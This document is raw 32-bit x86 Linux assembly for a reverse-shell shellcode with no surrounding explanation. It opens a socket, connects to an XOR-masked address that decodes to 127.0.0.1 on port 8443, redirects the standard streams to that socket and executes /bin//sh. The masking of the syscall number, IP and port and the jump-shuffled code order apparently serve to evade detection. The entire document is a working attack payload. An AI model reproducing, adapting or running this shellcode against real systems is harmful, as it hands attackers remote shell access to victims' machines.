        xor eax, eax
        jmp L55
        
        L7:xor ecx, 0x10101010 ; apply mask to get the IP
        push ecx            	; stack <- 127.0.0.1
        jmp L6
        
        LBOZO:
        push 0x1        
        push 0x2        
        mov ecx, esp
        int 0x80
        xor edx, edx
        mov edx, eax
        mov al, 0x66    
        jmp L1
        
        king:mov al, 0x3f            
        mov ebx, edx            
        xor ecx, ecx
        int 0x80
        mov al, 0x3f            
        mov cl, 0x1
        jmp loop
        
        L2:mov cx, 0xfa21      ; cx <- Masked port
        xor cx, 0x0101      ; apply mask to get the port
        push cx             ; stack <- 8443
        xor ecx, ecx       
        push word 0x2           
        mov esi, esp           
        push 0x10              
        push esi               
        push edx                
        mov ecx, esp
        int 0x80
        jmp king
        
        loop:int 0x80
        mov al, 0x3f           
        mov cl, 0x2
        int 0x80
        xor eax, eax
        mov al, 0x8         ; al <- masked 0xb
        xor al, 0x3         ; apply mask to get 0xb (execve)
        xor ebx, ebx
        push ebx                    
        push 0x68732f6e
        push 0x69622f2f
        jmp L3
        
	L1:mov bl, 0x3
        mov ecx, 0x1110106F ; ecx <- Masked IP address
        jmp L7
        L6:xor ecx, ecx    
        jmp L2
        
        L55:mov al, 0x66
        xor ebx, ebx
        mov bl, 0x1
        xor ecx, ecx
        push ecx
        jmp LBOZO
        
        L3:mov ebx, esp
        xor ecx, ecx
        xor edx, edx
        int 0x80

	
